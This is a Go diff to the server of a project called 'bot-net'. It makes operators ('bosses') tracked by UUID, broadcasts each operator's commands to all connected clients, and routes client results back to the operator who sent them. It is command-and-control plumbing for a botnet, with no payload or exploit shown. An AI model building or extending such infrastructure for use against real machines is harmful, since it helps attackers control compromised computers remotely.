@@ -9,18 +9,17 @@ import (
 	"strconv"
 	"strings"
 
-	"github.com/phanletrunghieu/bot-net/server/service/client"
-
 	"github.com/satori/go.uuid"
 
 	"github.com/phanletrunghieu/bot-net/common/cmd"
 	"github.com/phanletrunghieu/bot-net/server/domain"
+	"github.com/phanletrunghieu/bot-net/server/service/client"
 )
 
 // Service struct
 type Service struct {
 	listener      net.Listener
-	Bosses        []*domain.Boss
+	Bosses        map[uuid.UUID]*domain.Boss
 	clientService *client.Service
 	Error         chan error
 }
@@ -32,6 +31,7 @@ func NewBossService(port int, clientService *client.Service) *Service {
 	service := &Service{
 		clientService: clientService,
 		listener:      ln,
+		Bosses:        make(map[uuid.UUID]*domain.Boss),
 		Error:         make(chan error),
 	}
 
@@ -99,7 +99,9 @@ func (s *Service) handleConnection(boss *domain.Boss) {
 		}
 	}
 	boss.Conn.Write([]byte("Authenticated!\r"))
-	s.Bosses = append(s.Bosses, boss)
+	s.Bosses[boss.ID] = boss
+
+	go s.receiveClientResult()
 
 	// pass
 	for {
@@ -109,8 +111,6 @@ func (s *Service) handleConnection(boss *domain.Boss) {
 			s.Error <- err
 			return
 		}
-
-		log.Println(string(buffCommand))
 
 		switch string(buffCommand) {
 		case cmd.ListClients:
@@ -136,6 +136,8 @@ func (s *Service) handleConnection(boss *domain.Boss) {
 				break
 			}
 
+			msg = strings.TrimSpace(msg)
+
 			for _, client := range s.clientService.Clients {
 				err = s.clientService.SendDataToClient(client, boss, msg)
 				if err != nil {
@@ -144,6 +146,37 @@ func (s *Service) handleConnection(boss *domain.Boss) {
 			}
 
 			break
+		}
+	}
+}
+
+func (s *Service) receiveClientResult() {
+	for {
+		// 16 byte uuid
+		msg := <-s.clientService.ClientResultChan
+		buff := []byte(msg)
+
+		bossID := make([]byte, 16)
+		copy(bossID, buff[2:18])
+
+		buff = append(buff[:2], buff[18:]...)
+		buff = append(buff, '\r')
+
+		id, err := uuid.FromBytes(bossID)
+		if err != nil {
+			s.Error <- err
+			continue
+		}
+
+		if s.Bosses[id] == nil {
+			log.Println("Boss id not found")
+			continue
+		}
+
+		_, err = s.Bosses[id].Conn.Write(buff)
+		if err != nil {
+			s.Error <- err
+			continue
 		}
 	}
 }
